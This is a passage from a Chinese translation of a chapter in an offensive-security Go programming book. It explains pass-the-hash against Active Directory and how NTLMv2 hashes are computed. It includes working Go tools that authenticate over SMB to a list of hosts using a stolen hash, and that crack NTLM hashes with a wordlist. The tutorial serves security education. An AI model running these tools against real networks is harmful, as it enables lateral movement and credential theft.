Pass-the-hash 是一种快速实现典型的 *Active Directory 域攻破* 的方法，这种攻击方式中，攻击者首先获得一个初步立足点，提升权限，并在网络中横向移动，直到获得实现最终目标所需的访问权限。Active Directory 域攻破通常遵循此列表中的路线图，假设攻击是通过漏洞而非密码猜测等方式进行的：

1.  攻击者利用漏洞在网络上获取立足点。

1.  攻击者在被攻破的系统上提升权限。

1.  攻击者从 LSASS 中提取哈希值或明文凭证。

1.  攻击者试图通过离线破解恢复本地管理员密码。

1.  攻击者试图通过使用管理员凭证进行其他机器的认证，寻找密码的重用情况。

1.  攻击者不断重复该过程，直到域管理员或其他目标被攻破。

然而，在 NTLMSSP 认证下，即使在步骤 3 或 4 中未能恢复明文密码，也可以继续使用密码的 NTLM 哈希进行 SMB 认证，进入步骤 5——换句话说，就是传递哈希。

Pass-the-hash 技术之所以有效，是因为它将哈希计算与挑战-响应令牌计算分离开来。为了理解这一点，我们来看一下以下两个函数，它们由 NTLMSSP 规范定义，涉及用于认证的加密和安全机制：

**NTOWFv2** 是一个加密函数，它通过使用用户名、域和密码值来创建一个 MD5 HMAC，从而生成 NTLM 哈希值。

**ComputeResponse** 是一个函数，它将 NTLM 哈希与消息的客户端和服务器挑战、时间戳以及目标服务器名称结合使用，生成可以发送进行认证的 GSS-API 安全令牌。

你可以在 Listing 6-13 中看到这些函数的实现。

```
func Ntowfv2(pass, user, domain string) []byte {
    h := hmac.New(md5.New, Ntowfv1(pass))
    h.Write(encoder.ToUnicode(strings.ToUpper(user) + domain))
    return h.Sum(nil)
}

func ComputeResponseNTLMv2(nthash❶, lmhash, clientChallenge, serverChallenge, timestamp,
                           serverName []byte) []byte {

    temp := []byte{1, 1}
    temp = append(temp, 0, 0, 0, 0, 0, 0)
    temp = append(temp, timestamp...)
    temp = append(temp, clientChallenge...)
    temp = append(temp, 0, 0, 0, 0)
    temp = append(temp, serverName...)
    temp = append(temp, 0, 0, 0, 0)

    h := hmac.New(md5.New, nthash)
    h.Write(append(serverChallenge, temp...))
    ntproof := h.Sum(nil)
    return append(ntproof, temp...)
}
```

*Listing 6-13: 处理 NTLM 哈希 (*[/ch-6/smb/ntlmssp/crypto.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/crypto.go)*)*

NTLM 哈希作为输入传递给 `ComputeResponseNTLMv2` 函数 ❶，这意味着哈希是在与安全令牌创建逻辑无关的情况下独立生成的。这意味着无论哈希存储在哪里——即使是在 LSASS 中——都被视为预计算的，因为你不需要提供域、用户名或密码作为输入。认证过程如下：

1.  使用域、用户名和密码值来计算用户的哈希值。

1.  使用哈希作为输入来计算用于 NTLMSSP 认证的 SMB 认证令牌。

由于你已经有了哈希值，你已经完成了步骤 1。为了传递哈希，你启动了 SMB 认证序列，就像你在本章开头部分定义的那样。然而，你并没有计算哈希。相反，你直接使用提供的值作为哈希值。

Listing 6-14 展示了一个使用密码哈希来尝试作为特定用户认证到一组机器的 pass-the-hash 工具。

```
func main() {
    if len(os.Args) != 5 {
        log.Fatalln("Usage: main <target/hosts> <user> <domain> <hash>")
    }

    buf, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)
    }

    options := smb.Options{
        User:   os.Args[2],
        Domain: os.Args[3],
        Hash❶: os.Args[4],
        Port:   445,
    }

    targets := bytes.Split(buf, []byte{'\n'})
    for _, target := range targets❷ {
        options.Host = string(target)

        session, err := smb.NewSession(options, false)
        if err != nil {
            fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)
            continue
        }
        defer session.Close()
        if session.IsAuthenticated {
            fmt.Printf("[+] Login successful [%s]\n", options.Host)
        }
    }
}
```

*Listing 6-14: 使用哈希进行认证测试 (*[/ch-6/password-reuse/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/password-reuse/main.go)*)*

这段代码应该与密码猜测的例子相似。唯一显著的区别是，你设置了 `smb.Options` 的 `Hash` 字段（而不是 `Password` 字段） ❶，并且你遍历的是一组目标主机（而不是目标用户） ❷。`smb.NewSession()` 函数内的逻辑会使用填充在 `options` 结构体中的哈希值。

### 恢复 NTLM 密码

在某些情况下，仅拥有密码哈希不足以支持你的整体攻击链。例如，许多服务（如远程桌面、Outlook Web Access 等）不允许基于哈希的认证，因为要么不支持，要么不是默认配置。如果你的攻击链需要访问这些服务，你将需要明文密码。在接下来的部分中，你将了解哈希是如何计算的，以及如何创建一个基础的密码破解工具。

#### 计算哈希

在列表 6-15 中，您将执行计算哈希值的魔法。

```
func NewAuthenticatePass(domain, user, workstation, password string, c Challenge) Authenticate
{
    // Assumes domain, user, and workstation are not unicode
    nthash := Ntowfv2(password, user, domain)
    lmhash := Lmowfv2(password, user, domain)
    return newAuthenticate(domain, user, workstation, nthash, lmhash, c)
}

func NewAuthenticateHash(domain, user, workstation, hash string, c Challenge) Authenticate {
    // Assumes domain, user, and workstation are not unicode
    buf := make([]byte, len(hash)/2)
    hex.Decode(buf, []byte(hash))
    return newAuthenticate(domain, user, workstation, buf, buf, c)
}
```

*列表 6-15：计算哈希值 (*[/ch-6/smb/ntlmssp/ntlmssp.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/smb/ntlmssp/ntlmssp.go/)*)*

调用适当函数的逻辑在其他地方定义，但您会看到这两个函数是相似的。真正的区别在于，`NewAuthenticatePass()`函数中的基于密码的身份验证在生成身份验证消息之前会计算哈希值，而`NewAuthenticateHash()`函数则跳过该步骤，直接使用提供的哈希值作为输入生成消息。

#### 恢复 NTLM 哈希

在列表 6-16 中，您可以看到一个工具，它通过破解提供的 NTLM 哈希值来恢复密码。

```
func main() {
    if len(os.Args) != 5 {
 log.Fatalln("Usage: main <dictionary/file> <user> <domain> <hash>")
    }

    hash := make([]byte, len(os.Args[4])/2)
    _, err := hex.Decode(hash, []byte(os.Args[4]))❶
    if err != nil {
        log.Fatalln(err)
    }

    f, err := ioutil.ReadFile(os.Args[1])
    if err != nil {
        log.Fatalln(err)
    }

    var found string
    passwords := bytes.Split(f, []byte{'\n'})
    for _, password := range passwords❷ {
        h := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3]) ❸
        if bytes.Equal(hash, h)❹ {
            found = string(password)
            break
        }
    }
    if found != "" {
        fmt.Printf("[+] Recovered password: %s\n", found)
    } else {
        fmt.Println("[-] Failed to recover password")
    }
}
```

*列表 6-16：破解 NTLM 哈希值 (*[/ch-6/password-recovery/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-6/password-recovery/main.go)*)*

该工具将哈希值作为命令行参数读取，并将其解码为`[]byte` ❶。然后，您遍历提供的密码列表 ❷，通过调用我们之前讨论过的`ntlmssp.Ntowfv2()`函数 ❸ 来计算每个条目的哈希值。最后，您将计算出的哈希值与我们提供的值进行比较 ❹。如果它们匹配，则表示找到了目标，并跳出循环。

### 概要

您已经完成了对 SMB 的详细研究，涵盖了协议细节、反射、结构字段标签和混合编码！您还了解了如何使用哈希传递技术，以及一些利用 SMB 包的有用工具程序。

为了继续学习，我们鼓励您探索更多的 SMB 通信，特别是与远程代码执行相关的内容，如 PsExec。使用网络嗅探器（如 Wireshark），捕获数据包并评估此功能是如何工作的。

在下一章中，我们将从网络协议的具体内容转向攻击和掠夺数据库的主题。
